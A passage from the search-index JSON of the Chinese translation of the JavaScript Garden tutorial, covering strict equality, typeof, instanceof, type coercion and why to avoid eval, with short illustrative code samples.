<p>\u4e0a\u9762\u7684\u8868\u683c\u5c55\u793a\u4e86\u5f3a\u5236\u7c7b\u578b\u8f6c\u6362\uff0c\u8fd9\u4e5f\u662f\u4f7f\u7528 <code>==</code> \u88ab\u5e7f\u6cdb\u8ba4\u4e3a\u662f\u4e0d\u597d\u7f16\u7a0b\u4e60\u60ef\u7684\u4e3b\u8981\u539f\u56e0\uff0c \u7531\u4e8e\u5b83\u7684\u590d\u6742\u8f6c\u6362\u89c4\u5219\uff0c\u4f1a\u5bfc\u81f4\u96be\u4ee5\u8ddf\u8e2a\u7684\u95ee\u9898\u3002</p> <p>\u6b64\u5916\uff0c\u5f3a\u5236\u7c7b\u578b\u8f6c\u6362\u4e5f\u4f1a\u5e26\u6765\u6027\u80fd\u6d88\u8017\uff0c\u6bd4\u5982\u4e00\u4e2a\u5b57\u7b26\u4e32\u4e3a\u4e86\u548c\u4e00\u4e2a\u6570\u5b57\u8fdb\u884c\u6bd4\u8f83\uff0c\u5fc5\u987b\u4e8b\u5148\u88ab\u5f3a\u5236\u8f6c\u6362\u4e3a\u6570\u5b57\u3002</p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_53","title":"\u4e25\u683c\u7b49\u4e8e\u64cd\u4f5c\u7b26","text":"<p>\u4e25\u683c\u7b49\u4e8e\u64cd\u4f5c\u7b26\u7531**\u4e09**\u4e2a\u7b49\u53f7\u7ec4\u6210\uff1a<code>===</code></p> <p>\u4e0d\u50cf\u666e\u901a\u7684\u7b49\u4e8e\u64cd\u4f5c\u7b26\uff0c\u4e25\u683c\u7b49\u4e8e\u64cd\u4f5c\u7b26**\u4e0d\u4f1a**\u8fdb\u884c\u5f3a\u5236\u7c7b\u578b\u8f6c\u6362\u3002</p> <pre><code>\"\"           ===   \"0\"           // false\n0            ===   \"\"            // false\n0            ===   \"0\"           // false\nfalse        ===   \"false\"       // false\nfalse        ===   \"0\"           // false\nfalse        ===   undefined     // false\nfalse        ===   null          // false\nnull         ===   undefined     // false\n\" \\t\\r\\n\"    ===   0             // false\n</code></pre> <p>\u4e0a\u9762\u7684\u7ed3\u679c\u66f4\u52a0\u6e05\u6670\u5e76\u6709\u5229\u4e8e\u4ee3\u7801\u7684\u5206\u6790\u3002\u5982\u679c\u4e24\u4e2a\u64cd\u4f5c\u6570\u7c7b\u578b\u4e0d\u540c\u5c31\u80af\u5b9a\u4e0d\u76f8\u7b49\u4e5f\u6709\u52a9\u4e8e\u6027\u80fd\u7684\u63d0\u5347\u3002</p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_54","title":"\u6bd4\u8f83\u5bf9\u8c61","text":"<p>\u867d\u7136 <code>==</code> \u548c <code>===</code> \u64cd\u4f5c\u7b26\u90fd\u662f\u7b49\u4e8e\u64cd\u4f5c\u7b26\uff0c\u4f46\u662f\u5f53\u5176\u4e2d\u6709\u4e00\u4e2a\u64cd\u4f5c\u6570\u4e3a\u5bf9\u8c61\u65f6\uff0c\u884c\u4e3a\u5c31\u4e0d\u540c\u4e86\u3002</p> <pre><code>{} === {};                   // false\nnew String('foo') === 'foo'; // false\nnew Number(10) === 10;       // false\nvar foo = {};\nfoo === foo;                 // true\n</code></pre> <p>\u8fd9\u91cc\u7b49\u4e8e\u64cd\u4f5c\u7b26\u6bd4\u8f83\u7684**\u4e0d\u662f**\u503c\u662f\u5426\u76f8\u7b49\uff0c\u800c\u662f\u662f\u5426\u5c5e\u4e8e\u540c\u4e00\u4e2a**\u8eab\u4efd**\uff1b\u4e5f\u5c31\u662f\u8bf4\uff0c\u53ea\u6709\u5bf9\u8c61\u7684\u540c\u4e00\u4e2a\u5b9e\u4f8b\u624d\u88ab\u8ba4\u4e3a\u662f\u76f8\u7b49\u7684\u3002 \u8fd9\u6709\u70b9\u50cf Python \u4e2d\u7684 <code>is</code> \u548c C \u4e2d\u7684\u6307\u9488\u6bd4\u8f83\u3002</p> <p>**\u6ce8\u610f:**\u4e3a\u4e86\u66f4\u76f4\u89c2\u7684\u770b\u5230<code>==</code>\u548c<code>===</code>\u7684\u533a\u522b,\u53ef\u4ee5\u53c2\u89c1JavaScript Equality Table</p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_55","title":"\u7ed3\u8bba","text":"<p>\u5f3a\u70c8\u63a8\u8350\u4f7f\u7528**\u4e25\u683c\u7b49\u4e8e\u64cd\u4f5c\u7b26**\u3002\u5982\u679c\u7c7b\u578b\u9700\u8981\u8f6c\u6362\uff0c\u5e94\u8be5\u5728\u6bd4\u8f83\u4e4b\u524d\u663e\u5f0f\u7684\u8f6c\u6362\uff0c \u800c\u4e0d\u662f\u4f7f\u7528\u8bed\u8a00\u672c\u8eab\u590d\u6742\u7684\u5f3a\u5236\u8f6c\u6362\u89c4\u5219\u3002</p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#typeof","title":"<code>typeof</code> \u64cd\u4f5c\u7b26","text":"<p><code>typeof</code> \u64cd\u4f5c\u7b26\uff08\u548c <code>instanceof</code> \u4e00\u8d77\uff09\u6216\u8bb8\u662f JavaScript \u4e2d\u6700\u5927\u7684\u8bbe\u8ba1\u7f3a\u9677\uff0c \u56e0\u4e3a\u51e0\u4e4e\u4e0d\u53ef\u80fd\u4ece\u5b83\u4eec\u90a3\u91cc\u5f97\u5230\u60f3\u8981\u7684\u7ed3\u679c\u3002</p> <p>\u5c3d\u7ba1 <code>instanceof</code> \u8fd8\u6709\u4e00\u4e9b\u6781\u5c11\u6570\u7684\u5e94\u7528\u573a\u666f\uff0c<code>typeof</code> \u53ea\u6709\u4e00\u4e2a\u5b9e\u9645\u7684\u5e94\u7528\uff08**\u8bd1\u8005\u6ce8\uff1a**\u8fd9\u4e2a\u5b9e\u9645\u5e94\u7528\u662f\u7528\u6765\u68c0\u6d4b\u4e00\u4e2a\u5bf9\u8c61\u662f\u5426\u5df2\u7ecf\u5b9a\u4e49\u6216\u8005\u662f\u5426\u5df2\u7ecf\u8d4b\u503c\uff09\uff0c \u800c\u8fd9\u4e2a\u5e94\u7528\u5374**\u4e0d\u662f**\u7528\u6765\u68c0\u67e5\u5bf9\u8c61\u7684\u7c7b\u578b\u3002</p> <p>\u6ce8\u610f: \u7531\u4e8e <code>typeof</code> \u4e5f\u53ef\u4ee5\u50cf\u51fd\u6570\u7684\u8bed\u6cd5\u88ab\u8c03\u7528\uff0c\u6bd4\u5982 <code>typeof(obj)</code>\uff0c\u4f46\u8fd9\u5e76\u4e0d\u662f\u4e00\u4e2a\u51fd\u6570\u8c03\u7528\u3002 \u90a3\u4e24\u4e2a\u5c0f\u62ec\u53f7\u53ea\u662f\u7528\u6765\u8ba1\u7b97\u4e00\u4e2a\u8868\u8fbe\u5f0f\u7684\u503c\uff0c\u8fd9\u4e2a\u8fd4\u56de\u503c\u4f1a\u4f5c\u4e3a <code>typeof</code> \u64cd\u4f5c\u7b26\u7684\u4e00\u4e2a\u64cd\u4f5c\u6570\u3002 \u5b9e\u9645\u4e0a**\u4e0d\u5b58\u5728**\u540d\u4e3a <code>typeof</code> \u7684\u51fd\u6570\u3002</p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#javascript_1","title":"JavaScript \u7c7b\u578b\u8868\u683c","text":"<pre><code>Value               Class      Type\n-------------------------------------\n\"foo\"               String     string\nnew String(\"foo\")   String     object\n1.2                 Number     number\nnew Number(1.2)     Number     object\ntrue                Boolean    boolean\nnew Boolean(true)   Boolean    object\nnew Date()          Date       object\nnew Error()         Error      object\n[1,2,3]             Array      object\nnew Array(1, 2, 3)  Array      object\nnew Function(\"\")    Function   function\n/abc/g              RegExp     object (function in Nitro/V8)\nnew RegExp(\"meow\")  RegExp     object (function in Nitro/V8)\n{}                  Object     object\nnew Object()        Object     object\n</code></pre> <p>\u4e0a\u9762\u8868\u683c\u4e2d\uff0cType \u4e00\u5217\u8868\u793a <code>typeof</code> \u64cd\u4f5c\u7b26\u7684\u8fd0\u7b97\u7ed3\u679c\u3002\u53ef\u4ee5\u770b\u5230\uff0c\u8fd9\u4e2a\u503c\u5728\u5927\u591a\u6570\u60c5\u51b5\u4e0b\u90fd\u8fd4\u56de \"object\"\u3002</p> <p>Class \u4e00\u5217\u8868\u793a\u5bf9\u8c61\u7684\u5185\u90e8\u5c5e\u6027 <code>[[Class]]</code> \u7684\u503c\u3002</p> <p>JavaScript \u6807\u51c6\u6587\u6863\u4e2d\u5b9a\u4e49:<code>[[Class]]</code> \u7684\u503c\u53ea\u53ef\u80fd\u662f\u4e0b\u9762\u5b57\u7b26\u4e32\u4e2d\u7684\u4e00\u4e2a\uff1a<code>Arguments</code>, <code>Array</code>, <code>Boolean</code>, <code>Date</code>, <code>Error</code>,<code>Function</code>, <code>JSON</code>, <code>Math</code>, <code>Number</code>, <code>Object</code>, <code>RegExp</code>, <code>String</code>.</p> <p>\u4e3a\u4e86\u83b7\u53d6\u5bf9\u8c61\u7684 <code>[[Class]]</code>\uff0c\u6211\u4eec\u9700\u8981\u4f7f\u7528\u5b9a\u4e49\u5728 <code>Object.prototype</code> \u4e0a\u7684\u65b9\u6cd5 <code>toString</code>\u3002</p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_56","title":"\u5bf9\u8c61\u7684\u7c7b\u5b9a\u4e49","text":"<p>JavaScript \u6807\u51c6\u6587\u6863\u53ea\u7ed9\u51fa\u4e86\u4e00\u79cd\u83b7\u53d6 <code>[[Class]]</code> \u503c\u7684\u65b9\u6cd5\uff0c\u90a3\u5c31\u662f\u4f7f\u7528 <code>Object.prototype.toString</code>\u3002</p> <pre><code>function is(type, obj) {\n    var clas = Object.prototype.toString.call(obj).slice(8, -1);\n    return obj !== undefined &amp;&amp; obj !== null &amp;&amp; clas === type;\n}\n\nis('String', 'test'); // true\nis('String', new String('test')); // true\n</code></pre> <p>\u4e0a\u9762\u4f8b\u5b50\u4e2d\uff0c<code>Object.prototype.toString</code> \u65b9\u6cd5\u88ab\u8c03\u7528\uff0cthis \u88ab\u8bbe\u7f6e\u4e3a\u4e86\u9700\u8981\u83b7\u53d6 <code>[[Class]]</code> \u503c\u7684\u5bf9\u8c61\u3002</p> <p>\u8bd1\u8005\u6ce8\uff1a<code>Object.prototype.toString</code> \u8fd4\u56de\u4e00\u79cd\u6807\u51c6\u683c\u5f0f\u5b57\u7b26\u4e32\uff0c\u6240\u4ee5\u4e0a\u4f8b\u53ef\u4ee5\u901a\u8fc7 <code>slice</code> \u622a\u53d6\u6307\u5b9a\u4f4d\u7f6e\u7684\u5b57\u7b26\u4e32\uff0c\u5982\u4e0b\u6240\u793a\uff1a</p> <pre><code>Object.prototype.toString.call([])    // \"[object Array]\"\nObject.prototype.toString.call({})    // \"[object Object]\"\nObject.prototype.toString.call(2)    // \"[object Number]\"\n</code></pre> <p>ES5 \u63d0\u793a: \u5728 ECMAScript 5 \u4e2d\uff0c\u4e3a\u4e86\u65b9\u4fbf\uff0c\u5bf9 <code>null</code> \u548c <code>undefined</code> \u8c03\u7528 <code>Object.prototype.toString</code>\u65b9\u6cd5\uff0c \u5176\u8fd4\u56de\u503c\u7531 <code>Object</code> \u53d8\u6210\u4e86 <code>Null</code> \u548c <code>Undefined</code>\u3002</p> <p>**\u8bd1\u8005\u6ce8\uff1a**\u8fd9\u79cd\u53d8\u5316\u53ef\u4ee5\u4ece IE8 \u548c Firefox 4 \u4e2d\u770b\u51fa\u533a\u522b\uff0c\u5982\u4e0b\u6240\u793a\uff1a</p> <pre><code>// IE8\nObject.prototype.toString.call(null)    // \"[object Object]\"\nObject.prototype.toString.call(undefined)    // \"[object Object]\"\n\n// Firefox 4\nObject.prototype.toString.call(null)    // \"[object Null]\"\nObject.prototype.toString.call(undefined)    // \"[object Undefined]\"\n</code></pre>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_57","title":"\u6d4b\u8bd5\u4e3a\u5b9a\u4e49\u53d8\u91cf","text":"<pre><code>typeof foo !== 'undefined'\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4f1a\u68c0\u6d4b <code>foo</code> \u662f\u5426\u5df2\u7ecf\u5b9a\u4e49\uff1b\u5982\u679c\u6ca1\u6709\u5b9a\u4e49\u800c\u76f4\u63a5\u4f7f\u7528\u4f1a\u5bfc\u81f4 <code>ReferenceError</code> \u7684\u5f02\u5e38\u3002 \u8fd9\u662f <code>typeof</code> \u552f\u4e00\u6709\u7528\u7684\u5730\u65b9\u3002</p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_58","title":"\u7ed3\u8bba","text":"<p>\u4e3a\u4e86\u68c0\u6d4b\u4e00\u4e2a\u5bf9\u8c61\u7684\u7c7b\u578b\uff0c\u5f3a\u70c8\u63a8\u8350\u4f7f\u7528 <code>Object.prototype.toString</code> \u65b9\u6cd5\uff1b \u56e0\u4e3a\u8fd9\u662f\u552f\u4e00\u4e00\u4e2a\u53ef\u4f9d\u8d56\u7684\u65b9\u5f0f\u3002\u6b63\u5982\u4e0a\u9762\u8868\u683c\u6240\u793a\uff0c<code>typeof</code> \u7684\u4e00\u4e9b\u8fd4\u56de\u503c\u5728\u6807\u51c6\u6587\u6863\u4e2d\u5e76\u672a\u5b9a\u4e49\uff0c \u56e0\u6b64\u4e0d\u540c\u7684\u5f15\u64ce\u5b9e\u73b0\u53ef\u80fd\u4e0d\u540c\u3002</p> <p>\u9664\u975e\u4e3a\u4e86\u68c0\u6d4b\u4e00\u4e2a\u53d8\u91cf\u662f\u5426\u5df2\u7ecf\u5b9a\u4e49\uff0c\u6211\u4eec\u5e94\u5c3d\u91cf\u907f\u514d\u4f7f\u7528 <code>typeof</code> \u64cd\u4f5c\u7b26\u3002</p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#instanceof","title":"<code>instanceof</code> \u64cd\u4f5c\u7b26","text":"<p><code>instanceof</code> \u64cd\u4f5c\u7b26\u7528\u6765\u6bd4\u8f83\u4e24\u4e2a\u64cd\u4f5c\u6570\u7684\u6784\u9020\u51fd\u6570\u3002\u53ea\u6709\u5728\u6bd4\u8f83\u81ea\u5b9a\u4e49\u7684\u5bf9\u8c61\u65f6\u624d\u6709\u610f\u4e49\u3002 \u5982\u679c\u7528\u6765\u6bd4\u8f83\u5185\u7f6e\u7c7b\u578b\uff0c\u5c06\u4f1a\u548c <code>typeof</code> \u64cd\u4f5c\u7b26 \u4e00\u6837\u7528\u5904\u4e0d\u5927\u3002</p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_59","title":"\u6bd4\u8f83\u81ea\u5b9a\u4e49\u5bf9\u8c61","text":"<pre><code>function Foo() {}\nfunction Bar() {}\nBar.prototype = new Foo();\n\nnew Bar() instanceof Bar; // true\nnew Bar() instanceof Foo; // true\n\n// \u5982\u679c\u4ec5\u4ec5\u8bbe\u7f6e Bar.prototype \u4e3a\u51fd\u6570 Foo \u672c\u8eab\uff0c\u800c\u4e0d\u662f Foo \u6784\u9020\u51fd\u6570\u7684\u4e00\u4e2a\u5b9e\u4f8b\nBar.prototype = Foo;\nnew Bar() instanceof Foo; // false\n</code></pre>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#instanceof_1","title":"<code>instanceof</code> \u6bd4\u8f83\u5185\u7f6e\u7c7b\u578b","text":"<pre><code>new String('foo') instanceof String; // true\nnew String('foo') instanceof Object; // true\n\n'foo' instanceof String; // false\n'foo' instanceof Object; // false\n</code></pre> <p>\u6709\u4e00\u70b9\u9700\u8981\u6ce8\u610f\uff0c<code>instanceof</code> \u7528\u6765\u6bd4\u8f83\u5c5e\u4e8e\u4e0d\u540c JavaScript \u4e0a\u4e0b\u6587\u7684\u5bf9\u8c61\uff08\u6bd4\u5982\uff0c\u6d4f\u89c8\u5668\u4e2d\u4e0d\u540c\u7684\u6587\u6863\u7ed3\u6784\uff09\u65f6\u5c06\u4f1a\u51fa\u9519\uff0c \u56e0\u4e3a\u5b83\u4eec\u7684\u6784\u9020\u51fd\u6570\u4e0d\u4f1a\u662f\u540c\u4e00\u4e2a\u5bf9\u8c61\u3002</p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_60","title":"\u7ed3\u8bba","text":"<p><code>instanceof</code> \u64cd\u4f5c\u7b26\u5e94\u8be5**\u4ec5\u4ec5**\u7528\u6765\u6bd4\u8f83\u6765\u81ea\u540c\u4e00\u4e2a JavaScript \u4e0a\u4e0b\u6587\u7684\u81ea\u5b9a\u4e49\u5bf9\u8c61\u3002 \u6b63\u5982 <code>typeof</code> \u64cd\u4f5c\u7b26\u4e00\u6837\uff0c\u4efb\u4f55\u5176\u5b83\u7684\u7528\u6cd5\u90fd\u5e94\u8be5\u662f\u907f\u514d\u7684\u3002</p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_61","title":"\u7c7b\u578b\u8f6c\u6362","text":"<p>JavaScript \u662f_\u5f31\u7c7b\u578b_\u8bed\u8a00\uff0c\u6240\u4ee5\u4f1a\u5728**\u4efb\u4f55**\u53ef\u80fd\u7684\u60c5\u51b5\u4e0b\u5e94\u7528_\u5f3a\u5236\u7c7b\u578b\u8f6c\u6362_\u3002</p> <pre><code>// \u4e0b\u9762\u7684\u6bd4\u8f83\u7ed3\u679c\u662f\uff1atrue\nnew Number(10) == 10; // Number.toString() \u8fd4\u56de\u7684\u5b57\u7b26\u4e32\u88ab\u518d\u6b21\u8f6c\u6362\u4e3a\u6570\u5b57\n\n10 == '10';           // \u5b57\u7b26\u4e32\u88ab\u8f6c\u6362\u4e3a\u6570\u5b57\n10 == '+10 ';         // \u540c\u4e0a\n10 == '010';          // \u540c\u4e0a \nisNaN(null) == false; // null \u88ab\u8f6c\u6362\u4e3a\u6570\u5b57 0\n                      // 0 \u5f53\u7136\u4e0d\u662f\u4e00\u4e2a NaN\uff08\u8bd1\u8005\u6ce8\uff1a\u5426\u5b9a\u4e4b\u5426\u5b9a\uff09\n\n// \u4e0b\u9762\u7684\u6bd4\u8f83\u7ed3\u679c\u662f\uff1afalse\n10 == 010;\n10 == '-10';\n</code></pre> <p>ES5 \u63d0\u793a: \u4ee5 <code>0</code> \u5f00\u5934\u7684\u6570\u5b57\u5b57\u9762\u503c\u4f1a\u88ab\u4f5c\u4e3a\u516b\u8fdb\u5236\u6570\u5b57\u89e3\u6790\u3002 \u800c\u5728 ECMAScript 5 \u4e25\u683c\u6a21\u5f0f\u4e0b\uff0c\u8fd9\u4e2a\u7279\u6027\u88ab**\u79fb\u9664**\u4e86\u3002</p> <p>\u4e3a\u4e86\u907f\u514d\u4e0a\u9762\u590d\u6742\u7684\u5f3a\u5236\u7c7b\u578b\u8f6c\u6362\uff0c**\u5f3a\u70c8**\u63a8\u8350\u4f7f\u7528\u4e25\u683c\u7684\u7b49\u4e8e\u64cd\u4f5c\u7b26\u3002 \u867d\u7136\u8fd9\u53ef\u4ee5\u907f\u514d\u5927\u90e8\u5206\u7684\u95ee\u9898\uff0c\u4f46 JavaScript \u7684\u5f31\u7c7b\u578b\u7cfb\u7edf\u4ecd\u7136\u4f1a\u5bfc\u81f4\u4e00\u4e9b\u5176\u5b83\u95ee\u9898\u3002</p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_62","title":"\u5185\u7f6e\u7c7b\u578b\u7684\u6784\u9020\u51fd\u6570","text":"<p>\u5185\u7f6e\u7c7b\u578b\uff08\u6bd4\u5982 <code>Number</code> \u548c <code>String</code>\uff09\u7684\u6784\u9020\u51fd\u6570\u5728\u88ab\u8c03\u7528\u65f6\uff0c\u4f7f\u7528\u6216\u8005\u4e0d\u4f7f\u7528 <code>new</code> \u7684\u7ed3\u679c\u5b8c\u5168\u4e0d\u540c\u3002</p> <pre><code>new Number(10) === 10;     // False, \u5bf9\u8c61\u4e0e\u6570\u5b57\u7684\u6bd4\u8f83\nNumber(10) === 10;         // True, \u6570\u5b57\u4e0e\u6570\u5b57\u7684\u6bd4\u8f83\nnew Number(10) + 0 === 10; // True, \u7531\u4e8e\u9690\u5f0f\u7684\u7c7b\u578b\u8f6c\u6362\n</code></pre> <p>\u4f7f\u7528\u5185\u7f6e\u7c7b\u578b <code>Number</code> \u4f5c\u4e3a\u6784\u9020\u51fd\u6570\u5c06\u4f1a\u521b\u5efa\u4e00\u4e2a\u65b0\u7684 <code>Number</code> \u5bf9\u8c61\uff0c \u800c\u5728\u4e0d\u4f7f\u7528 <code>new</code> \u5173\u952e\u5b57\u7684 <code>Number</code> \u51fd\u6570\u66f4\u50cf\u662f\u4e00\u4e2a\u6570\u5b57\u8f6c\u6362\u5668\u3002</p> <p>\u53e6\u5916\uff0c\u5728\u6bd4\u8f83\u4e2d\u5f15\u5165\u5bf9\u8c61\u7684\u5b57\u9762\u503c\u5c06\u4f1a\u5bfc\u81f4\u66f4\u52a0\u590d\u6742\u7684\u5f3a\u5236\u7c7b\u578b\u8f6c\u6362\u3002</p> <p>\u6700\u597d\u7684\u9009\u62e9\u662f\u628a\u8981\u6bd4\u8f83\u7684\u503c**\u663e\u5f0f**\u7684\u8f6c\u6362\u4e3a\u4e09\u79cd\u53ef\u80fd\u7684\u7c7b\u578b\u4e4b\u4e00\u3002</p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_63","title":"\u8f6c\u6362\u4e3a\u5b57\u7b26\u4e32","text":"<pre><code>'' + 10 === '10'; // true\n</code></pre> <p>\u5c06\u4e00\u4e2a\u503c\u52a0\u4e0a\u7a7a\u5b57\u7b26\u4e32\u53ef\u4ee5\u8f7b\u677e\u8f6c\u6362\u4e3a\u5b57\u7b26\u4e32\u7c7b\u578b\u3002</p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_64","title":"\u8f6c\u6362\u4e3a\u6570\u5b57","text":"<pre><code>+'10' === 10; // true\n</code></pre> <p>\u4f7f\u7528**\u4e00\u5143**\u7684\u52a0\u53f7\u64cd\u4f5c\u7b26\uff0c\u53ef\u4ee5\u628a\u5b57\u7b26\u4e32\u8f6c\u6362\u4e3a\u6570\u5b57\u3002</p> <p>**\u8bd1\u8005\u6ce8\uff1a**\u5b57\u7b26\u4e32\u8f6c\u6362\u4e3a\u6570\u5b57\u7684\u5e38\u7528\u65b9\u6cd5\uff1a</p> <pre><code>+'010' === 10\nNumber('010') === 10\nparseInt('010', 10) === 10  // \u7528\u6765\u8f6c\u6362\u4e3a\u6574\u6570\n\n+'010.2' === 10.2\nNumber('010.2') === 10.2\nparseInt('010.2', 10) === 10\n</code></pre>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_65","title":"\u8f6c\u6362\u4e3a\u5e03\u5c14\u578b","text":"<p>\u901a\u8fc7\u4f7f\u7528 \u5426 \u64cd\u4f5c\u7b26\u4e24\u6b21\uff0c\u53ef\u4ee5\u628a\u4e00\u4e2a\u503c\u8f6c\u6362\u4e3a\u5e03\u5c14\u578b\u3002</p> <pre><code>!!'foo';   // true\n!!'';      // false\n!!'0';     // true\n!!'1';     // true\n!!'-1'     // true\n!!{};      // true\n!!true;    // true\n</code></pre>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_66","title":"\u6838\u5fc3","text":""},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#eval","title":"\u4e3a\u4ec0\u4e48\u4e0d\u8981\u4f7f\u7528 <code>eval</code>","text":"<p><code>eval</code> \u51fd\u6570\u4f1a\u5728\u5f53\u524d\u4f5c\u7528\u57df\u4e2d\u6267\u884c\u4e00\u6bb5 JavaScript \u4ee3\u7801\u5b57\u7b26\u4e32\u3002</p> <pre><code>var foo = 1;\nfunction test() {\n    var foo = 2;\n    eval('foo = 3');\n    return foo;\n}\ntest(); // 3\nfoo; // 1\n</code></pre> <p>\u4f46\u662f <code>eval</code> \u53ea\u5728\u88ab**\u76f4\u63a5**\u8c03\u7528\u5e76\u4e14\u8c03\u7528\u51fd\u6570\u5c31\u662f <code>eval</code> \u672c\u8eab\u65f6\uff0c\u624d\u5728\u5f53\u524d\u4f5c\u7528\u57df\u4e2d\u6267\u884c\u3002</p> <pre><code>var foo = 1;\nfunction test() {\n    var foo = 2;\n    var bar = eval;\n    bar('foo = 3');\n    return foo;\n}\ntest(); // 2\nfoo; // 3\n</code></pre> <p>**\u8bd1\u8005\u6ce8\uff1a**\u4e0a\u9762\u7684\u4ee3\u7801\u7b49\u4ef7\u4e8e\u5728\u5168\u5c40\u4f5c\u7528\u57df\u4e2d\u8c03\u7528 <code>eval</code>\uff0c\u548c\u4e0b\u9762\u4e24\u79cd\u5199\u6cd5\u6548\u679c\u4e00\u6837\uff1a</p> <pre><code>// \u5199\u6cd5\u4e00\uff1a\u76f4\u63a5\u8c03\u7528\u5168\u5c40\u4f5c\u7528\u57df\u4e0b\u7684 foo \u53d8\u91cf\nvar foo = 1;\nfunction test() {\n    var foo = 2;\n    window.foo = 3;\n    return foo;\n}\ntest(); // 2\nfoo; // 3\n\n// \u5199\u6cd5\u4e8c\uff1a\u4f7f\u7528 call \u51fd\u6570\u4fee\u6539 eval \u6267\u884c\u7684\u4e0a\u4e0b\u6587\u4e3a\u5168\u5c40\u4f5c\u7528\u57df\nvar foo = 1;\nfunction test() {\n    var foo = 2;\n    eval.call(window, 'foo = 3');\n    return foo;\n}\ntest(); // 2\nfoo; // 3\n</code></pre> <p>\u5728**\u4efb\u4f55\u60c5\u51b5\u4e0b**\u6211\u4eec\u90fd\u5e94\u8be5\u907f\u514d\u4f7f\u7528 <code>eval</code> \u51fd\u6570\u300299.9% \u4f7f\u7528 <code>eval</code> \u7684\u573a\u666f\u90fd\u6709**\u4e0d\u4f7f\u7528** <code>eval</code> \u7684\u89e3\u51b3\u65b9\u6848\u3002</p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#eval_1","title":"\u4f2a\u88c5\u7684 <code>eval</code>","text":"<p>\u5b9a\u65f6\u51fd\u6570 <code>setTimeout</code> \u548c <code>setInterval</code> \u90fd\u53ef\u4ee5\u63a5\u53d7\u5b57\u7b26\u4e32\u4f5c\u4e3a\u5b83\u4eec\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u3002 \u8fd9\u4e2a\u5b57\u7b26\u4e32**\u603b\u662f**\u5728\u5168\u5c40\u4f5c\u7528\u57df\u4e2d\u6267\u884c\uff0c\u56e0\u6b64 <code>eval</code> \u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\u6ca1\u6709\u88ab\u76f4\u63a5\u8c03\u7528\u3002</p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_67","title":"\u5b89\u5168\u95ee\u9898","text":"<p><code>eval</code> \u4e5f\u5b58\u5728\u5b89\u5168\u95ee\u9898\uff0c\u56e0\u4e3a\u5b83\u4f1a\u6267\u884c**\u4efb\u610f**\u4f20\u7ed9\u5b83\u7684\u4ee3\u7801\uff0c \u5728\u4ee3\u7801\u5b57\u7b26\u4e32\u672a\u77e5\u6216\u8005\u662f\u6765\u81ea\u4e00\u4e2a\u4e0d\u4fe1\u4efb\u7684\u6e90\u65f6\uff0c\u7edd\u5bf9\u4e0d\u8981\u4f7f\u7528 <code>eval</code> \u51fd\u6570\u3002</p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_68","title":"\u7ed3\u8bba","text":"<p>\u7edd\u5bf9\u4e0d\u8981\u4f7f\u7528 <code>eval</code>\uff0c\u4efb\u4f55\u4f7f\u7528\u5b83\u7684\u4ee3\u7801\u90fd\u4f1a\u5728\u5b83\u7684\u5de5\u4f5c\u65b9\u5f0f\uff0c\u6027\u80fd\u548c\u5b89\u5168\u6027\u65b9\u9762\u53d7\u5230\u8d28\u7591\u3002 \u5982\u679c\u4e00\u4e9b\u60c5\u51b5\u5fc5\u987b\u4f7f\u7528\u5230 <code>eval</code> \u624d\u80fd\u6b63\u5e38\u5de5\u4f5c\uff0c\u9996\u5148\u5b83\u7684\u8bbe\u8ba1\u4f1a\u53d7\u5230\u8d28\u7591\uff0c\u8fd9**\u4e0d\u5e94\u8be5**\u662f\u9996\u9009\u7684\u89e3\u51b3\u65b9\u6848\uff0c \u4e00\u4e2a\u66f4\u597d\u7684\u4e0d\u4f7f\u7528 <code>eval</code> \u7684\u89e3\u51b3\u65b9\u6848\u5e94\u8be5\u5f97\u5230\u5145\u5206\u8003\u8651\u5e76\u4f18\u5148\u91c7\u7528\u3002</p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#undefined-null","title":"<code>undefined</code> \u548c <code>null</code>","text":"<p>JavaScript \u6709\u4e24\u4e2a\u8868\u793a\u2018\u7a7a\u2019\u7684\u503c\uff0c\u5176\u4e2d\u6bd4\u8f83\u6709\u7528\u7684\u662f 